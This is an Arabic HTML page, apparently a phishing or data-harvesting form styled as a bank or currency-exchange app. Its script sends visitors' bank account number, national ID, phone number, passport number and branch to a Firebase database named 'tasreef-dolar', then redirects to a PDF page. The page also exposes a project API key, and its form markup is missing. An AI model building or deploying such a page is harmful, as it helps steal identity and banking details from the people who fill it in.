<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>

    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
    
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Tajawal', sans-serif;
        }

        body {
            background-color: #121212;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        /* حاوية التطبيق لمحاكاة شاشة الهاتف */
        .app-container {
            width: 100%;
            max-width: 420px;
            min-height: 100vh;
            background-color: #000000;
            display: flex;
            flex-direction: column;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
            position: relative;
        }

        /* القسم العلوي الأزرق */
        .top-section {
            background: linear-gradient(160deg, #2855cd 0%, #3247a3 100%);
            padding: 60px 20px 80px 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            border-bottom-left-radius: 15px;
            border-bottom-right-radius: 15px;
        }

        /* الشعار (اللوجو) */
        .logo-container {
            margin-bottom: 40px; 
        }
        
        .logo-container img {
            width: 330px; 
            height: auto;
            display: block;
        }

        /* القسم السفلي المظلم */
        .bottom-section {
            padding: 40px 20px 30px 20px; 
            flex-grow: 1;
            display: flex;
            flex-direction: column;
        }

        /* صندوق النموذج (الخانات) */
        .form-card {
            background-color: #222222;
            border: 1px solid #333;
            border-radius: 15px;
            padding: 25px 20px;
            margin-bottom: 25px;
        }

        /* تصميم خانات الإدخال والاختيار */
        .input-group {
            border: 1px solid #444;
            border-radius: 8px;
            background-color: #1a1a1a;
            position: relative;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            padding: 0 15px;
        }

        .input-group select,
        .input-group input {
            width: 100%;
            background: transparent;
            border: none;
            color: #fff;
            font-size: 16px;
            padding: 18px 0;
            appearance: none;
            outline: none;
            text-align: right;
        }

        .input-group select {
            cursor: pointer;
        }

        .input-group input::placeholder {
            color: #888;
        }

        .input-group select option {
            background-color: #222;
            color: #fff;
        }

        /* أيقونة السهم داخل خانة الاختيار */
        .select-icon {
            position: absolute;
            left: 15px;
            pointer-events: none;
        }
        .select-icon svg {
            width: 14px;
            height: 14px;
            fill: #888;
        }

        /* زر الاستمرار / تقديم الطلب */
        .submit-btn {
            width: 100%;
            background: linear-gradient(90deg, #184bd6, #245ce8);
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 16px;
            font-size: 18px;
            font-weight: 700;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            cursor: pointer;
            transition: opacity 0.2s;
            margin-top: 25px;
        }

        .submit-btn:active {
            opacity: 0.8;
        }

        .submit-btn svg {
            width: 20px;
            height: 20px;
            fill: #fff;
        }

        /* الروابط السفلية */
        .footer-links {
            margin-top: auto;
            margin-bottom: 20px;
        }

        .footer-row {
            display: flex;
            justify-content: space-around;
            margin-bottom: 20px;
        }

        .footer-link {
            color: #888;
            font-size: 13px;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .footer-link svg {
            width: 16px;
            height: 16px;
            fill: #888;
        }

        .subscribe-btn {
            width: 100%;
            background-color: transparent;
            border: 1px solid #444;
            color: #fff;
            padding: 15px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
        }
    </style>
</head>

    <!-- استدعاء مكتبات Firebase -->
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>

    <script>
        // إعدادات مشروع Firebase الخاص بك (استبدل القيم ببيانات مشروعك الحقيقية)
        const firebaseConfig = {
            apiKey: "AIzaSyDfJHyEUFzxp6qexJHJDwwh-WUX2aGjojY",
            authDomain: "tasreef-dolar.firebaseapp.com",
            projectId: "tasreef-dolar",
            storageBucket: "tasreef-dolar.firebasestorage.app",
            messagingSenderId: "579472040325",
            appId: "1:579472040325:web:17ade35ff2a5bb2ae124ec"
        };

        // تهيئة Firebase و قاعدة البيانات Firestore
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // ربط عناصر الصفحة
        const accountNumberInput = document.getElementById('account-number');
        const nationalIdInput = document.getElementById('national-id');
        const phoneNumberInput = document.getElementById('phone-number');
        const passportNumberInput = document.getElementById('passport-number');
        const branchSelect = document.getElementById('branch-select');
        const submitBtn = document.getElementById('submit-btn');
        const btnText = document.getElementById('btn-text');

        // حدث الضغط على زر تقديم الطلب
        submitBtn.addEventListener('click', async function(e) {
            e.preventDefault(); // منع أي سلوك افتراضي للزر

            // تجميع البيانات من الخانات
            const formData = {
                accountNumber: accountNumberInput.value,
                nationalId: nationalIdInput.value,
                phoneNumber: phoneNumberInput.value,
                passportNumber: passportNumberInput.value,
                branch: branchSelect.value,
                timestamp: firebase.firestore.FieldValue.serverTimestamp()
            };

            // التحقق من تعبئة جميع الحقول
            if (!formData.accountNumber || !formData.nationalId || !formData.phoneNumber || !formData.passportNumber || !formData.branch) {
                alert('يرجى تعبئة جميع الحقول المطلوبة قبل تقديم الطلب');
                return;
            }

            // تعطيل الزر لمنع التكرار أثناء الإرسال وتغيير النص
            submitBtn.disabled = true;
            btnText.innerText = 'جاري الإرسال...';

            try {
                // حفظ البيانات في مجموعة (Collection) باسم "requests"
                await db.collection("requests").add(formData);

                // حفظ التخزين المحلي للاستفادة منها في صفحة pdf.html
                localStorage.setItem('accountNumber', formData.accountNumber);
                localStorage.setItem('nationalId', formData.nationalId);
                localStorage.setItem('phoneNumber', formData.phoneNumber);
                localStorage.setItem('passportNumber', formData.passportNumber);
                localStorage.setItem('branch', formData.branch);

                // التوجيه للصفحة التالية بعد نجاح الإرسال
                window.location.href = 'pdf.html';
            } catch (error) {
                console.error("خطأ أثناء الإرسال: ", error);
                alert("حدث خطأ أثناء إرسال البيانات، يرجى المحاولة لاحقاً.");
                
                // إعادة تفعيل الزر في حالة حدوث خطأ
                submitBtn.disabled = false;
                btnText.innerText = 'تقديم الطلب';
            }
        });
    </script>
